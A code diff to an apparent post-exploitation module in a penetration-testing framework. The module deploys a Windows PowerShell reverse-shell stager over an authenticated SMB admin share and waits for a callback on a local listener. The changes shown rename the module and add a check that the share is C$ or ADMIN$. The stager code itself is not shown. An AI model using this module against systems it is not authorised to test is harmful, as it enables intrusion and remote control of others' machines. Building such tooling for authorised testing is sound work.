@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 
 """
-Deploy a reverse shell from an SMB session.
+Deploy a Windows reverse shell from an SMB session.
 
 Uploads a PowerShell stager to a writable admin share, executes it remotely
 via impacket (SCM/PsExec-style), and waits for a callback on a local listener.
@@ -23,7 +23,7 @@ from lib.protocols.smb.smb_session_mixin import SMBSessionMixin
 
 class Module(Post, Reverse, SMBSessionMixin):
     __info__ = {
-        "name": "SMB Deploy Reverse Shell",
+        "name": "SMB Windows Deploy Reverse Shell",
         "description": (
             "From an authenticated SMB session, upload a PowerShell reverse TCP stager "
             "and execute it remotely to obtain a classic shell session."
@@ -109,6 +109,22 @@ class Module(Post, Reverse, SMBSessionMixin):
         drive = share.replace("$", ":") if share.endswith("$") else share + ":"
         return drive + remote_path.replace("/", "\\")
 
+    def _validate_windows_admin_share(self, share: str, info: dict) -> bool:
+        if share.upper() in {"C$", "ADMIN$"}:
+            return True
+        print_error(
+            "This module deploys a Windows PowerShell stager and expects a writable "
+            "admin share such as C$ or ADMIN$."
+        )
+        print_info(
+            f"Current SMB session exposes shares: {', '.join(info.get('shares') or []) or 'unknown'}"
+        )
+        print_info(
+            "For a Linux/Samba share such as public, use post/smb/file/upload_file "
+            "or a Linux-specific post module instead."
+        )
+        return False
+
     def run(self):
         lhost_val = str(self.lhost).strip()
         lport_val = int(self.lport)
@@ -134,6 +150,9 @@ class Module(Post, Reverse, SMBSessionMixin):
         stager_script = self._generate_stager_script(lhost_val, lport_val)
 
         share, remote_path = self._remote_path()
+        if not self._validate_windows_admin_share(share, info):
+            return False
+
         windows_path = self._windows_path_from_remote(share, remote_path)
         print_info(f"Remote staging path: \\\\{host}\\{share}{remote_path}")
 
